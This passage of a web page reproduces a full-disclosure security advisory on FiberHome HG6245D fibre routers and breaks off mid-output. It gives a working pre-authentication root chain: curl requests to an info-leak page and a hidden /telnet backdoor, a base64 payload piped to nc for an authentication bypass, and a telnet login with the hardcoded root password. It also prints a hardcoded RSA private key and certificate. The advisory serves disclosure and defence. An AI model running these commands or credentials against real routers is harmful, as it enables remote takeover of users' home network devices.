class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">The complete version on &quot;Multiple vulnerabilities found in FiberHome  <br>HG6245D routers&quot;  <br>is posted here:  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>  <br>  <br>=== text-version of the advisory ===  <br>  <br>-----BEGIN PGP SIGNED MESSAGE-----  <br>Hash: SHA512  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Advisory Information</span></span>  <br>  <br>Title: Multiple vulnerabilities found in FiberHome HG6245D routers  <br>Advisory URL: https://pierrekim.github.io/advisories/2021-fiberhome-0x00-ont.txt  <br>Blog URL: https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>Date published: 2021-01-12  <br>Vendors contacted: None  <br>Release mode: Full-Disclosure  <br>CVE: None yet assigned  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Product Description</span></span>  <br>  <br>FiberHome Technologies is a leading equipment vendor and global  <br>solution provider in the field of information technology and  <br>telecommunications.  <br>  <br>The FiberHome HG6245D routers are GPON FTTH routers. They are mainly  <br>used in South America and  <br>in Southeast Asia (from Shodan). These devices come with competitive  <br>pricing but are very powerful, with a lot of memory and storage.  <br>  <br>I validated the vulnerabilities against HG6245D, RP2602:  <br>  <br><span class="hljs-meta">Config#</span><span class="bash"> show version</span>  <br>show version  <br>Hardware version : WKE2.094.277A01  <br>Software version : RP2602  <br>Minor version : 00.00  <br>Basic part version : RP2602  <br>Generate time : Apr 1 2019 19:38:05  <br>  <br>Some vulnerabilities have been tested successfully against another  <br>fiberhome device (AN5506-04-FA, firmware RP2631, 4 April 2019). The  <br>fiberhome devices have quite a similar codebase, so it is likely all  <br>other fiberhome devices (AN5506-04-FA, AN5506-04-FAT, AN5506-04-F) are  <br>also vulnerable.  <br>  <br>  <br>On the first analysis, attack surface is not huge:  <br>- - only HTTP/HTTPS is listening by default on the LAN  <br>- - It is also possible to enable a CLI telnetd (not reachable by  <br>default) on port 23/tcp by using hardcoded credentials on the web  <br>admin interface (`https://target/fh`).  <br>  <br>Futhermore, due to the lack of firewall for IPv6 connectivity, all the  <br>internal services will be reachable over IPv6 (from the Internet).  <br>  <br>It is in fact trivial to achieve pre-auth RCE as root against the  <br>device, from the WAN (using IPv6) and from the LAN (IPv4 or IPv6).  <br>This scenario involves reaching the webserver to:  <br>1. enable a proprietary CLI telnetd (using backdoor credentials for  <br>HTTP or using the backdoor `/telnet` HTTP API or using a stack  <br>overflow in the HTTP server in previous fiberhome routers [and  <br>skipping next steps])  <br>2. enable the Linux telnetd using authentication bypass or with  <br>backdoor credentials  <br>3. use backdoor credentials to get a root shell on the Linux telnetd  <br>  <br>Example of such scenario in 4 steps from a different network:  <br>  <br><span class="hljs-meta">$</span><span class="bash"> curl -k https://target/info.asp <span class="hljs-comment"># pre-auth infoleak, extract the</span></span>  <br>WAN MAC, very similar to the br0 MAC, used to enable the next  <br>backdoor. On the same network segment, use `arp -na`  <br><span class="hljs-meta">$</span><span class="bash"> curl -k <span class="hljs-string">&#x27;https://target/telnet?enable=1&amp;key=ENDING_PART_MAC_ADDR&#x27;</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> backdoor access to authorize access to CLI telnet on port 23/tcp</span>  <br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> GgpoZWxwCmxpc3QKd2hvCmRkZAp0c2hlbGwK | base64 -d | nc</span>  <br>target 23 &gt;/dev/null &amp; # auth bypass + start of Linux telnetd on port  <br>26/tcp  <br><span class="hljs-meta">$</span><span class="bash"> telnet target 26 <span class="hljs-comment"># backdoor root access with root / GEPON</span></span>  <br>(none) login: root  <br>Password: [GEPON]  <br>BusyBox v1.27.2 (2019-04-01 19:16:06 CST) built-in shell (ash)  <br><span class="hljs-meta">#</span><span class="bash">id</span>  <br>uid=0(root) gid=0 groups=0 # game over  <br>  <br>Please note this research was done in the beginning of 2020 and a new  <br>firmware image may be available and may patch some vulnerabilities  <br>(even if I highly doubt it). This research was supposed to be  <br>presented during a private security event last year which was  <br>postponed due to the COVID-19 situation.  <br>  <br>Full-disclosure is applied as it is believed that some backdoors have  <br>been intentionally placed by the vendor.  <br>  <br>Also, it is public knowledge from 2019 that Fiberhome devices have  <br>weak passwords and RCE vulnerabilities. This quote is from 2019  <br>(https://blog.netlab.360.com/some-fiberhome-routers-are-being-utilized-as-ssh-tunneling-proxy-nodes-2/):  <br>  <br><span class="hljs-meta">&gt;</span><span class="bash"> We didn<span class="hljs-string">&#x27;t see how Gwmndy malware spread, but we know that some Fiberhome router Web systems have weak passwords and there are RCE vulnerabilities.</span></span>  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Vulnerabilities Summary</span></span>  <br>  <br>The summary of the vulnerabilities is:  <br>  <br>1. Insecure IPv6 connectivity  <br>2. HTTP Server - Passwords in HTTP logs  <br>3. HTTP Server - Harcoded SSL certificates  <br>4. HTTP server - Pre-auth InfoLeak  <br>5. HTTP Server - Backdoor allowing telnet access  <br>6. HTTP Server - Hardcoded credentials  <br>7. HTTP Server - TR-069 hardcoded credentials  <br>8. HTTP Server - Credentials decryption algorithm  <br>9. Telnet server (Linux) - Hardcoded credentials  <br>10. Telnet server (CLI) - Hardcoded credentials  <br>11. Telnet server (CLI) - Privilege escalation  <br>12. Telnet server (CLI) - Authentication bypass  <br>13. Telnet server (CLI) - Authentication bypass to start the Linux telnetd  <br>14. Telnet server (CLI) - DoS  <br>15. System - Credentials stored in clear-text  <br>16. System - Passwords stored in clear-text in nvram  <br>17. Misc - Remote stack overflow in the HTTP server (AN5506-04-FA / RP2631)  <br>  <br>I removed several DoS and strange technical details (linked to  <br>undisclosed vulnerabilities) for clarity.  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - Insecure IPv6 connectivity</span></span>  <br>  <br>By default, there are no firewall rules for the IPv6 connectivity,  <br>exposing the internal management interfaces from the Internet.  <br>  <br>An attacker can get a full access to the management http server (using  <br>hardcoded passwords) and the telnet services, by reaching the IPv6s  <br>assigned to the wan0 and the br0 interfaces.  <br>  <br>  <br>On the device:  <br>  <br><span class="hljs-meta">#</span><span class="bash">ifconfig wan0</span>  <br>wan0 Link encap:Ethernet HWaddr [REMOVED]  <br>[...]  <br>inet6 addr: [REMOVED]/64 Scope:Global  <br>[...]  <br>UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1  <br>  <br><span class="hljs-meta">#</span><span class="bash">ifconfig br0</span>  <br>br0 Link encap:Ethernet HWaddr [REMOVED]  <br>inet addr:192.168.1.1 Bcast:192.168.1.255 Mask:255.255.255.0  <br>inet6 addr: [REMOVED]/64 Scope:Global  <br>[...]  <br>UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1  <br>  <br>  <br>`br0` is the internal network interface assigned to the LAN.  <br>All the services are binding to both `br0` and `wan0`.  <br>  <br>It is trivial to reach services from the WAN (Internet), by contacting  <br>IPv6 used by `br0` or `wan0`:  <br>  <br>- From the WAN:  <br>  <br><span class="hljs-meta">rasp-wan-olt%</span><span class="bash"> telnet [ipv6] 26</span>  <br>Trying [ipv6]...  <br>Connected to [ipv6].  <br>Escape character is &#x27;^]&#x27;.  <br>  <br>(none) login:  <br><span class="hljs-meta">telnet&gt;</span><span class="bash"> q</span>  <br>Connection closed.  <br>  <br><span class="hljs-meta">rasp-wan-olt%</span><span class="bash"> telnet [ipv6] 80</span>  <br>Trying [ipv6]...  <br>Connected to [ipv6].  <br>Escape character is &#x27;^]&#x27;.  <br>GET / HTTP/1.0  <br>  <br>HTTP/1.0 302 Redirect  <br>Server: GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN  <br>Date: Mon Jan 7 21:01:29 2020  <br>Pragma: no-cache  <br>Cache-Control: no-cache  <br>Content-Type: text/html  <br>X-Frame-Options: SAMEORIGIN  <br>Location: https://  <br>  <br>&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;  <br>This document has moved to a new &lt;a  <br>href=&quot;https://&quot;&gt;location&lt;/a&gt;.  <br>Please update your documents to reflect the new location.  <br>&lt;/body&gt;&lt;/html&gt;  <br>  <br>Connection closed by foreign host.  <br><span class="hljs-meta">rasp-wan-olt%</span><span class="bash"> </span> <br>  <br>  <br>By using `ip6tables` on the device, we can confirm the complete lack  <br>of firewall rules for IPv6 connectivity:  <br>  <br><span class="hljs-meta">#</span><span class="bash">ip6tables -nL</span>  <br>Chain INPUT (policy ACCEPT)  <br>target prot opt source destination  <br>  <br>Chain FORWARD (policy ACCEPT)  <br>target prot opt source destination  <br>forward_ext_ip all ::/0 ::/0  <br>forward_ext_url all ::/0 ::/0  <br>forward_ext_mac all ::/0 ::/0  <br>  <br>Chain OUTPUT (policy ACCEPT)  <br>target prot opt source destination  <br>  <br>Chain forward_ext_ds_ip (1 references)  <br>target prot opt source destination  <br>  <br>Chain forward_ext_ip (1 references)  <br>target prot opt source destination  <br>forward_ext_us_ip all ::/0 ::/0  <br>forward_ext_ds_ip all ::/0 ::/0  <br>  <br>Chain forward_ext_mac (1 references)  <br>target prot opt source destination  <br>  <br>Chain forward_ext_url (1 references)  <br>target prot opt source destination  <br>  <br>Chain forward_ext_us_ip (1 references)  <br>target prot opt source destination  <br><span class="hljs-meta">#</span><span class="bash"> </span> <br>  <br>  <br>I highly recommend disabling IPv6 connectivity.  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - HTTP Server - Passwords in HTTP logs</span></span>  <br>  <br>It is possible to find passwords and authentication cookies stored in  <br>clear-text in HTTP logs:  <br>  <br><span class="hljs-meta">#</span><span class="bash">cat /fhconf/web_log/web.log</span>  <br><span class="hljs-meta">web_utils&gt;</span><span class="bash">2020-01-07</span>  <br>19:16:26,../utils/cu_sessionManagement.c[465](findUser): no user named  <br>admin !  <br>&lt;web_custom&gt;2020-01-07  <br>19:16:27,../custom/weblogin.c[595](webLogin):  <br>*************userGroupName = 1  <br>&lt;web_init&gt;2020-01-07  <br>19:16:27,../utils/utils.c[1399](get_admin_default_info): enter  <br>get_admin_default_info  <br>&lt;web_custom&gt;2020-01-07  <br>19:16:27,../custom/weblogin.c[812](webLogin): Warning! Password error!  <br>password = [REMOVED]  <br>&lt;web_utils&gt;2020-01-07  <br>19:27:24,../utils/cu_sessionManagement.c[238](createSession): create  <br>user [REMOVED]  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - HTTP Server - Harcoded SSL certificates</span></span>  <br>  <br>The web management is done over HTTPS, using a hardcoded private key  <br>with 777 permissions:  <br>  <br><span class="hljs-meta">#</span><span class="bash">ls -la /fhrom/bin/web/certSrv.pem /fhrom/bin/web/privkeySrv.pem</span>  <br>-rwxrwxrwx 1 root 0 883 Apr 1 2019  <br>/fhrom/bin/web/certSrv.pem  <br>-rwxrwxrwx 1 root 0 887 Apr 1 2019  <br>/fhrom/bin/web/privkeySrv.pem  <br><span class="hljs-meta">#</span><span class="bash">cat /fhrom/bin/web/privkeySrv.pem</span>  <br>-----BEGIN RSA PRIVATE KEY-----  <br>MIICWwIBAAKBgQCY22+N/5InUhmotgU8jh9nQdyTmKYwFJKpvMek9fJK8rCsrED7  <br>yl+mvUPv3yqLyMgvu1AcMmYEyngpbw94rnd2k91wiRGUGUSq8mTRPFwnplTPI8hI  <br>JglMsKcskzRP951jxsiSS1eMlLcEd9iMUcpjUbgWzxKH0fFlRD5d8jYPtwIDAQAB  <br>AoGANEjy6n5d7sc9caD5P5JZmYdEvNO9HLscw6SIIZvjCdHjrtyoybeaaj1ZDKao  <br>NfIyz2jh6RMwJDlhSsLrZts+jzB+k7fAqUkdLi6fkZmpamL1OEHMqzWdWuVFgCjd  <br>uf8ZMMuQ+/3gx/tjjG0sBuL/ko1Q7oxoIty+4xm9cwqGGtkCQQDKIJYYp9385gk4  <br>8qDcdgnc39kmsheUB5VS0pU1/pxL2YIJltq79yghwQisaNsUUk4LMW6hNyPx7Knx  <br>jRpHLsgTAkEAwZkVbjo3Ll+fM+1oPPcY4i960DURrR9eMVhq771n+GzCs9gEy2Ea  <br>HW5f0yamZBMURZWECu1W0s764QkHXwzWTQJAaYGi95HAVT86NyinAQz4TvvlnMY/  <br>enyO3GGhk0KpEQqjTyAYYx87KotZXK2LFct0g3E1Hx/qOmDfwH935QotUwJAH4mE  <br>iDRLkO5azOa7uFK4ZwA9DXXXr1AQ1BEHOo6sRTfSb+GcxlTHIEw+p/L/4AWLo9o7  <br>bFxFbInzLH2ACefZcQJAJ+US+g9Dp4tiLrenketRv9+3nOPGod2WOGqjMaEqOgmC  <br>RjGu2aI9YguR3FuX3W9KOOg3EDn/l/O1XynBPRO9Aw==  <br>-----END RSA PRIVATE KEY-----  <br><span class="hljs-meta">#</span><span class="bash">cat /fhrom/bin/web/certSrv.pem</span>  <br>-----BEGIN CERTIFICATE-----  <br>MIICXzCCAcgCCQCqr5AgCgFdqzANBgkqhkiG9w0BAQUFADB0MQswCQYDVQQGEwJD  <br>SDELMAkGA1UECBMCSFUxCzAJBgNVBAcTAldVMQswCQYDVQQKEwJGSDELMAkGA1UE  <br>CxMCU0YxDDAKBgNVBAMTA1BPTjEjMCEGCSqGSIb3DQEJARYUUE9OQEZJQkVSSE9N  <br>RS5DT00uQ04wHhcNMTMwNDI0MDEyMTUwWhcNMjMwNDIyMDEyMTUwWjB0MQswCQYD  <br>VQQGEwJDSDELMAkGA1UECBMCSFUxCzAJBgNVBAcTAldVMQswCQYDVQQKEwJGSDEL  <br>MAkGA1UECxMCU0YxDDAKBgNVBAMTA1BPTjEjMCEGCSqGSIb3DQEJARYUUE9OQEZJ  <br>QkVSSE9NRS5DT00uQ04wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAJjbb43/  <br>kidSGai2BTyOH2dB3JOYpjAUkqm8x6T18krysKysQPvKX6a9Q+/fKovIyC+7UBwy  <br>ZgTKeClvD3iud3aT3XCJEZQZRKryZNE8XCemVM8jyEgmCUywpyyTNE/3nWPGyJJL  <br>V4yUtwR32IxRymNRuBbPEofR8WVEPl3yNg+3AgMBAAEwDQYJKoZIhvcNAQEFBQAD  <br>gYEACZJepEU36h3PMc0O15Bo7zkBWm2dD0RbTrJeZF561VcxlpuE2GDirNCXAbZz  <br>Ue/x+fDQBEM8kqpFYcVMPzZBUdFwu1QIY0DottXVcFFNoKS54GL9LEMaS6l6R/D5  <br>G8bCy/RF3kZwzE2cflZ7x78zdpQpzzDcOD415ek5zkadhu0=  <br>-----END CERTIFICATE-----  <br><span class="hljs-meta">#</span><span class="bash"> </span> <br>  <br>Another hardcoded private key is also available (?!) in  <br>`/fhrom/bin/web` and can be downloaded over HTTPS:  <br>  <br><span class="hljs-meta">#</span><span class="bash">ls -la /fhrom/bin/web/privkeySrv.pem</span>  <br>-rwxrwxrwx 1 root 0 887 Apr 1 2019  <br>/fhrom/bin/web/privkeySrv.pem  <br>  <br><span class="hljs-meta">$</span><span class="bash"> curl -k https://192.168.1.1/privkeySrv.pem</span>  <br>-----BEGIN RSA PRIVATE KEY-----  <br>MIICWwIBAAKBgQCY22+N/5InUhmotgU8jh9nQdyTmKYwFJKpvMek9fJK8rCsrED7  <br>yl+mvUPv3yqLyMgvu1AcMmYEyngpbw94rnd2k91wiRGUGUSq8mTRPFwnplTPI8hI  <br>JglMsKcskzRP951jxsiSS1eMlLcEd9iMUcpjUbgWzxKH0fFlRD5d8jYPtwIDAQAB  <br>AoGANEjy6n5d7sc9caD5P5JZmYdEvNO9HLscw6SIIZvjCdHjrtyoybeaaj1ZDKao  <br>NfIyz2jh6RMwJDlhSsLrZts+jzB+k7fAqUkdLi6fkZmpamL1OEHMqzWdWuVFgCjd  <br>uf8ZMMuQ+/3gx/tjjG0sBuL/ko1Q7oxoIty+4xm9cwqGGtkCQQDKIJYYp9385gk4  <br>8qDcdgnc39kmsheUB5VS0pU1/pxL2YIJltq79yghwQisaNsUUk4LMW6hNyPx7Knx  <br>jRpHLsgTAkEAwZkVbjo3Ll+fM+1oPPcY4i960DURrR9eMVhq771n+GzCs9gEy2Ea  <br>HW5f0yamZBMURZWECu1W0s764QkHXwzWTQJAaYGi95HAVT86NyinAQz4TvvlnMY/  <br>enyO3GGhk0KpEQqjTyAYYx87KotZXK2LFct0g3E1Hx/qOmDfwH935QotUwJAH4mE  <br>iDRLkO5azOa7uFK4ZwA9DXXXr1AQ1BEHOo6sRTfSb+GcxlTHIEw+p/L/4AWLo9o7  <br>bFxFbInzLH2ACefZcQJAJ+US+g9Dp4tiLrenketRv9+3nOPGod2WOGqjMaEqOgmC  <br>RjGu2aI9YguR3FuX3W9KOOg3EDn/l/O1XynBPRO9Aw==  <br>-----END RSA PRIVATE KEY-----  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - HTTP server - Pre-auth InfoLeak</span></span>  <br>  <br>It is possible to extract information from the device without  <br>authentication by disabling Javascript and visiting `/info.asp`:  <br>  <br><span class="hljs-meta">$</span><span class="bash"> curl -k https://192.168.1.1/info.asp</span>  <br>[..]  <br>  <br>Software Version: [REMOVED]  <br>[...]  <br>ONU State: [REMOVED]  <br>Regist State: [REMOVED]  <br>LOID: [REMOVED] &lt;----------- Secret used for FTTH connection  <br>[...]  <br>IP Address: [REMOVED]  <br>Subnet Mask: [REMOVED]  <br>IPv6 Address: [REMOVED]  <br>DHCP Clients List: [REMOVED]  <br>Wan IP: [REMOVED]  <br>WAN Mac: [REMOVED] &lt;-------- Used for the telnet backdoor  <br>[...]  <br>  <br>Also, it is very easy to guess the MAC address of the `br0` interface  <br>based on the WAN MAC address (e.g.: `wan0`: `xx:xx:xx:xx:xx:x3`, `br0`  <br>will be `xx:xx:xx:xx:xx:x0`).  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - HTTP Server - Backdoor allowing telnet access</span></span>  <br>  <br>In order to reach the telnetd CLI server, it is also possible to reach  <br>a backdoor API without authentication provided by the HTTP server.  <br>This will remove firewall rules and allow an attacker to reach the  <br>telnet server (used for CLI).  <br>  <br>This backdoor can be found inside the `webs` binary:  <br>  <br>- From `sub_C46F8()` (called from main()):  <br>  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>  <br>The `backdoor_telnet()` function (named during reverse engineering,  <br>the original name is unknown):  <br>  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>  <br>We can reverse the function `omci_set_telnet_uni_state()` from  <br>`libgl3_advance.so`:  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>  <br>On line 24, rules will be added depending of the value of the argument  <br>of this function.  <br>  <br>  <br>Finally, the `getOnuMac()` function will provide a custom valid entry  <br>from the MAC address of the `br0` interface:  <br>  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>  <br>The backdoor is reachable by sending a HTTPS request:  <br>  <br>- - https://[ip]/telnet?enable=0&amp;key=calculated(BR0_MAC)  <br>  <br>The &#x27;secret&#x27; algorithm will extract the ending part of the mac address.  <br>  <br>For the MAC: AA:AA:AA:01:02:03, an attacker can enable the backdoor by sending:  <br>  <br><span class="hljs-meta">$</span><span class="bash"> curl -k <span class="hljs-string">&#x27;https://[ip]/telnet?enable=1&amp;key=010203&#x27;</span></span>  <br>  <br>Opening the access to the telnetd:  <br>  <br><span class="hljs-meta">$</span><span class="bash"> curl -k <span class="hljs-string">&#x27;https://192.168.1.1/telnet?enable=1&amp;key=[REMOVED]&#x27;</span></span>  <br>Open telnet success!  <br><span class="hljs-meta">$</span><span class="bash"> telnet 192.168.1.1</span>  <br>Trying 192.168.1.1...  <br>Connected to 192.168.1.1.  <br>Escape character is &#x27;^]&#x27;.  <br>  <br>------acl 